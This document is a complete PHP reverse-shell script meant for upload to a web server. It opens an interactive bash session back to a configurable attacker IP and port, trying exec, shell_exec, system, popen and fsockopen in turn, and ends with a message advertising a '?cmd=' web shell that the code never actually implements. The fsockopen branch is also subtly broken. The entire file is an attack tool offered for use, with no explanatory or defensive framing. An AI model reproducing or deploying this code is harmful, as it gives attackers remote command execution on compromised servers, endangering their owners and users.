<?php
$ip = '10.198.75.187';  // Replace with your IP
$port = '7777';         // Replace with your port

// Try exec()
if (function_exists('exec')) {
    exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
}
// Try shell_exec()
elseif (function_exists('shell_exec')) {
    shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
}
// Try system()
elseif (function_exists('system')) {
    system("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
}
// Try popen()
elseif (function_exists('popen')) {
    popen("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'", "r");
}
// Try fsockopen()
elseif (function_exists('fsockopen')) {
    $socket = fsockopen($ip, $port);
    if ($socket) {
        shell_exec("/bin/sh -i <&3 >&3 2>&3");
    }
}
// If none of the above works, use a web shell (fallback)
else {
    echo "<pre>Web shell is available. Execute commands with ?cmd=your_command</pre>";
}
?>
